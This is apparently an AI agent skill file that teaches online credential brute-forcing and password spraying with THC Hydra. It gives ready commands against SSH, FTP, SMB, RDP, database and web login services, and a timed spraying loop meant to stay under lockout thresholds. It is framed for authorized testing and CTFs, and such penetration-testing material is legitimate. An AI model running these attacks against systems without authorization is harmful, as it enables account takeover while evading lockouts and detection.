---
name: hydra
description: >-
  Run online login brute-force and password spraying with THC Hydra. Use
  when a user asks to test the login strength of SSH/FTP/HTTP/SMB/RDP
  services they own, validate a credential list against a target during an
  authorized engagement, or run a CTF login brute challenge.
license: Apache-2.0
compatibility: 'THC Hydra 9.x, Linux/macOS'
metadata:
  author: terminal-skills
  version: 1.0.0
  category: devops
  tags:
    - hydra
    - brute-force
    - credential-testing
    - penetration-testing
    - password-spraying
---

# THC Hydra

## Overview

Hydra is the standard online credential testing tool: it throws username/password pairs at live services (SSH, FTP, HTTP forms, SMB, RDP, MySQL, PostgreSQL, Telnet, VNC, and 50+ more) and reports valid combinations. Unlike offline crackers (John, hashcat), Hydra attacks live services — rate limits, account lockouts, and alerting systems all apply. Use only for authorized security testing and CTFs.

## Instructions

### Step 1: Prepare Usernames and Passwords

```bash
# One entity per line
cat > users.txt <<'EOF'
admin
root
postgres
svc_backup
jdoe
EOF

# Reasonable password list (don't use rockyou — 14M lines is pointless online)
cat > passwords.txt <<'EOF'
Summer2026!
ChangeMe123
Winter2025!
Welcome1
Password1
EOF

# Common wordlists on Kali
ls /usr/share/wordlists/seclists/Passwords/Common-Credentials/
```

### Step 2: Attack Specific Services

```bash
# SSH
hydra -L users.txt -P passwords.txt -t 4 -f -V ssh://10.0.0.5
# -t 4  threads (keep low on SSH to avoid lockouts)
# -f    stop after first valid pair per host
# -V    verbose — print every attempt

# FTP
hydra -L users.txt -P passwords.txt ftp://10.0.0.5 -f

# SMB (domain accounts)
hydra -L users.txt -P passwords.txt smb://10.0.0.10 -f

# RDP (slow — RDP itself rate-limits)
hydra -L users.txt -P passwords.txt rdp://10.0.0.20 -t 1 -f

# MySQL / PostgreSQL
hydra -L users.txt -P passwords.txt mysql://10.0.0.5
hydra -L users.txt -P passwords.txt postgres://10.0.0.5
```

### Step 3: HTTP Form Attacks

```bash
# POST form — inspect the target form first
# <form action="/login" method="POST">
#   <input name="username">
#   <input name="password">
# </form>
# On failure, the response contains: "Invalid credentials"

hydra -L users.txt -P passwords.txt 10.0.0.5 http-post-form \
  '/login:username=^USER^&password=^PASS^:F=Invalid credentials' \
  -t 4 -f -V

# HTTPS with cookies and custom headers
hydra -L users.txt -P passwords.txt example.com -s 443 https-post-form \
  '/api/auth:user=^USER^&pass=^PASS^:F=error\":\"bad_creds:H=Cookie\: csrftoken=abc123' \
  -t 2 -f

# Basic auth
hydra -L users.txt -P passwords.txt 10.0.0.5 http-get /admin/
```

### Step 4: Password Spraying (Safer than Brute-Force)

```bash
# One password across many users — avoids lockouts
hydra -L all-users.txt -p 'Summer2026!' ssh://10.0.0.5 -t 1 -W 3 -f

# Sequential sprays with delay
for pw in 'Spring2026!' 'Summer2026!' 'Welcome123!'; do
  hydra -L all-users.txt -p "$pw" ssh://10.0.0.5 -t 1 -W 3
  sleep 3600  # one password per hour — well under lockout thresholds
done
```

### Step 5: Output and Resume

```bash
# Save results
hydra -L users.txt -P passwords.txt ssh://10.0.0.5 \
  -o results.txt -f

# Restore after interruption
hydra -R
# Reads ./hydra.restore and resumes
```

## Examples

### Example 1: Audit Your Own SSH Bastion

```bash
# In the engagement agreement: "Authorized to test bastion.example.com for
# credential strength on a list of service accounts."

cat > svc-users.txt <<'EOF'
svc_backup
svc_ci
svc_monitor
svc_deploy
EOF

# 1000-entry wordlist tailored to the org
cat > targeted.txt <<'EOF'
Acme2026!
Acme2025!
BackupService1
CiRunner!
MonitorAcme!
EOF

hydra -L svc-users.txt -P targeted.txt \
  -t 2 -W 5 -f -V \
  -o audit-ssh.log \
  ssh://bastion.example.com

# Expected output:
# [22][ssh] host: bastion.example.com  login: svc_backup  password: BackupService1
# Report weak credentials, rotate, done.
```

### Example 2: CTF — Break a Login Form

```bash
# Reconnaissance first
curl -sS -X POST http://10.10.10.50/login -d 'username=wrong&password=wrong' -i
# Response contains: "Login failed. Try again."

# Hydra with the matching failure string
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  10.10.10.50 http-post-form \
  '/login:username=^USER^&password=^PASS^:F=Login failed' \
  -t 16 -f

# [80][http-post-form] host: 10.10.10.50  login: admin  password: letmein2024
```

## Guidelines

- **Only target systems you own or have written authorization for.** Online brute-force against third-party services is illegal and loud.
- Online attacks trip account lockouts — start with password spraying (one password × many users) before doing per-user brute force.
- Keep thread counts low (`-t 1..4`). High concurrency causes false negatives when services rate-limit, and alerts defenders.
- Always inspect the target form manually first to identify the real failure string — wrong `F=` matches make every attempt look successful.
- Use `-W seconds` between attempts on lockout-prone services (AD, RDP).
- Hydra is for live services. For captured hashes, switch to John or hashcat.
- On web apps, prefer `ffuf` or `wfuzz` for deeper customization (headers, JSON bodies, CSRF tokens). Hydra is faster but less flexible.
- Log every session with `-o` so you can reproduce findings and feed them into the final report.
